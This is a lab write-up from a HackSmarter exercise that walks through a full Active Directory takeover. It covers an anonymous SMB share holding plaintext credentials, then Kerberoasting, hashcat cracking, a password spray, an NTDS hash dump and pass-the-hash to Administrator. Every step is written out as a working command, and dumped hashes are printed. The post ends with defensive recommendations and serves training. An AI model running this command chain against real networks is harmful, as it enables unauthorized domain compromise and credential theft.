---
layout: post
title: "Active Directory Domain Compromise: From Anonymous Access to Full Domain Takeover"
date: 2026-07-21 23:50:00 +0400
excerpt: "One anonymous file share, a cracked password, and a repeated mistake led to full control of an entire domain, starting from zero credentials."
toc:
  - id: bearings
    title: Scanning the target
  - id: finding-the-note
    title: Finding a note I wasn't meant to see
  - id: foothold
    title: Turning it into access
  - id: mapping
    title: Mapping the domain
  - id: spn
    title: A weak service account
  - id: cracking
    title: Cracking the password
  - id: mistake
    title: The password got reused
  - id: confirming
    title: Confirming admin access
  - id: ntds
    title: Grabbing every password hash
  - id: pth
    title: Logging in as Administrator
  - id: path
    title: The full attack path
  - id: didnt-work
    title: What didn't work
  - id: why
    title: Why this matters
  - id: recommendations
    title: How to fix this
---

## Introduction

This lab is from [HackSmarter](https://www.hacksmarter.org/courses/8da0b008-7692-4c3f-a861-b7a02a536e7b/take). I like this one because it's not about some rare, exotic exploit, it's about how far a single small mistake can go if nobody catches it in time.

I started with nothing. No username, no password, just one IP address. By the end, I had full control of the domain: every password hash, the ability to forge my own logins, and Administrator access on the server itself. Here's the story of how that happened, one small step at a time.

**Domain:** `DRY.MARTINI.BARS` · **DC:** `DC01` (`10.1.221.180`)

---

## Scanning the target {#bearings}

Before touching anything, I like to know what I'm actually dealing with. So I ran a full port scan against the one IP I had.

```bash
nmap -sC -sV -oN nmap_scan.txt 10.1.221.180
```

```
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-21 19:09:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

This told me almost everything I needed to know. Ports like 88 (Kerberos), 389 (LDAP), and 445 (SMB) are the fingerprint of a Windows Domain Controller. The LDAP banner even spelled out the domain name for me: `DRY.MARTINI.BARS`. No guesswork needed, this was the heart of the network.

![Nmap scan revealing Domain Controller ports on 10.1.221.180](/assets/images/img1-1.png)

With no login yet, my next move was simple: see what I could reach without one.

## Finding a note I wasn't meant to see {#finding-the-note}

A lot of networks leave file shares open to anyone, no login required. That's always worth checking first.

```bash
smbclient -L //10.1.221.180 -N
```

One folder stood out: `notes`. Nothing about the name screamed "sensitive," which is exactly why it was worth a look.

![Anonymous SMB share listing showing the notes share](/assets/images/img1-2.png)

```bash
smbclient //10.1.221.180/notes -N
```

Inside was a single file: `notes.txt`.

```bash
!cat notes.txt
```

```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint
creds
mprice:*martini*
```

Sitting right under a personal to-do list was a username and password, in plain text, on a share anyone could read. That's it. That's the whole mistake that opened the door.

![Contents of notes.txt showing mprice credentials](/assets/images/img1-3.png)

## Turning it into access {#foothold}

Finding a password is one thing. Knowing if it actually works is another.

```bash
nxc smb 10.1.221.180 -u mprice -p '*martini*'
```

```
DRY.MARTINI.BARS\mprice:*martini*
```

It worked. I now had a real, logged-in account inside the domain.

![Validating mprice credentials against SMB](/assets/images/img1-4.png)

Next, I checked what that account could actually do.

```bash
nxc smb 10.1.221.180 -u mprice -p '*martini*' --shares
```

```
notes      READ,WRITE
SYSVOL     READ
NETLOGON   READ
```

Nothing powerful yet, just normal access. But it was enough to keep exploring.

![Shares enumerated using mprice credentials](/assets/images/img1-5.png)

## Mapping the domain {#mapping}

With a working login, I could finally see the shape of the domain properly. First, the list of users.

```bash
nxc smb 10.1.221.180 -u mprice -p '*martini*' --users
```

Six accounts came back: `Administrator`, `Guest`, `krbtgt`, `mprice`, `athena.t0`, and `ATHENA_SVC`.

![Domain user list enumerated with mprice credentials](/assets/images/img1.png)

Then the machines that made up the network.

```bash
nxc ldap 10.1.221.180 -u mprice -p '*martini*' --query "(objectClass=computer)" ""
```

Two showed up: `DC01`, which we already knew was the Domain Controller, and `EVILPC`.

![Domain computer objects DC01 and EVILPC](/assets/images/img2.png)

![Domain computer objects DC01 and EVILPC](/assets/images/img2-1.png)

I also confirmed I could still query LDAP even with signing enforced on the server, worth knowing for later.

```bash
nxc ldap 10.1.221.180 -u mprice -p '*martini*' --groups
```

![LDAP group enumeration confirming access with mprice](/assets/images/img3.png)

## A weak service account {#spn}

One name on that user list caught my eye: `ATHENA_SVC`. Anything named like that is almost always a service account, and service accounts are often set up with more access than they need and passwords nobody ever rotates.

If a service account has something called an SPN attached to it, any regular domain user can request a Kerberos ticket for it, no extra permissions needed, and try to crack that ticket offline. So I checked.

```bash
nxc ldap 10.1.221.180 -u mprice -p '*martini*' --kerberoasting kerb.txt
```

```
ATHENA_SVC

$krb5tgs$23$*ATHENA_SVC$...
```

`ATHENA_SVC` had exactly that setup. I now had its ticket saved locally, ready to attack.

![Kerberoasting hit returning a TGS hash for ATHENA_SVC](/assets/images/img3-1.png)

## Cracking the password {#cracking}

With the ticket saved, it was time to see if the password behind it was weak enough to guess.

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

It cracked almost instantly against a common wordlist. The password was `1dirtymartini`.

![Hashcat cracking the kerberoasted ticket to reveal the password](/assets/images/img3-2.png)

## The password got reused {#mistake}

The obvious first move was to try the cracked password against the account it came from.

```bash
nxc smb 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini'
```

It worked. `ATHENA_SVC` was mine.

![Validating the cracked password against ATHENA_SVC](/assets/images/img4.png)

But passwords rarely stay in one place. People reuse them, and so do the accounts managing them. So I tried the same password across the whole domain.

```bash
crackmapexec smb 10.1.221.0/24 -u users.txt -d DRY.MARTINI.BARS -p '1dirtymartini'
```

```
DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```

Same password, different account, and this one, `athena.t0`, had admin rights on the Domain Controller. One reused password had just handed me the keys to the whole environment.

![Password spray hit showing athena.t0 Pwn3d](/assets/images/img4-1.png)

## Confirming admin access {#confirming}

Finding a hit is easy. Proving what it actually gets you matters more.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --shares
```

```
ADMIN$   READ,WRITE
C$       READ,WRITE
```

Full read and write access to `ADMIN$` and `C$` is about as clear a sign as you'll get. This wasn't just another user account, it was a fully privileged one.

![Admin shares ADMIN and C with read write access](/assets/images/img5.png)

To remove any doubt, I ran a command directly on the server.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' -x "whoami"
```

```
dry\athena.t0
```

That was the moment things shifted. This wasn't just poking around anymore, I had admin-level control of the Domain Controller.

![Whoami output confirming execution as athena.t0](/assets/images/img6.png)

## Grabbing every password hash {#ntds}

With that level of access, there was one obvious next step: pull the entire password database for the domain.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --ntds
```

Every account came back with its hash: `Administrator`, `krbtgt`, `mprice`, `athena.t0`, `ATHENA_SVC`, `DC01$`, `EVILPC$`. In one file, I now had everything needed to move freely through this entire environment.

![NTDS dump showing full account list and hashes](/assets/images/img7.png)

One entry mattered more than the rest: `krbtgt`, with the hash `22ebc290e67668629c8d0812662a9c51`. This is the account behind Kerberos authentication itself. Owning its hash means being able to create valid logins on demand, long after this specific attack is "cleaned up." Resetting a few passwords wouldn't be enough to remove this kind of access.

## Logging in as Administrator {#pth}

I had hashes. The question was whether I even needed the actual passwords behind them. With Windows, usually not.

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS
```

```
DRY.MARTINI.BARS\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
```

No password needed. Just the hash itself, pulled straight from the earlier dump, logging me in as the most powerful account in the domain.

![Pass the hash authentication as Administrator Pwn3d](/assets/images/img8.png)

One last check to be sure:

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS -x "whoami"
```

```
dry\administrator
```

![Whoami output confirming execution as domain administrator](/assets/images/img9.png)

Starting from a single anonymous file share, the domain was now completely mine.

---

## The full attack path {#path}

```
Anonymous SMB → notes.txt → mprice creds → domain enumeration
→ ATHENA_SVC kerberoastable → cracked ticket → password reuse
→ athena.t0 admin → NTDS dump → KRBTGT exposed → Pass-the-Hash → Administrator
```

None of this needed a clever exploit or anything exotic. It just needed patience, and an eye for the small mistakes that show up in real environments all the time: a note left somewhere it shouldn't have been, an account with more permissions than it needed, and a password used one time too many.

## What didn't work {#didnt-work}

Not everything went smoothly, and that's worth sharing too.

**BloodHound wouldn't run.** The server had LDAP signing turned on, which blocks the kind of connection BloodHound needs by default. A good reminder that some tools assume a level of misconfiguration that isn't always there.

**Grabbing the share with just the hash didn't work at first.** `smbclient` wanted a plain password, not a hash. I had to switch to a tool built to accept hashes instead.

## Why this matters {#why}

None of this took a sophisticated attack. It came from ordinary mistakes: a password sitting in plain text on a share anyone could read, a service account that didn't need the access it had, and that same password showing up again on a much more powerful account. Put those together, and one open file share is enough to hand over an entire domain.

## How to fix this {#recommendations}

- Never store passwords in plain text on any file share, especially ones open to anyone
- Turn off anonymous share access unless it's truly needed
- Only give service accounts the specific access they need, with long, random passwords
- Don't reuse passwords between accounts, ever
- Keep an eye out for password spray attempts across the network
- Move service accounts to gMSA instead of manually managed passwords
- Turn on MFA for privileged accounts wherever possible
- Review Active Directory permissions regularly, not just after something goes wrong
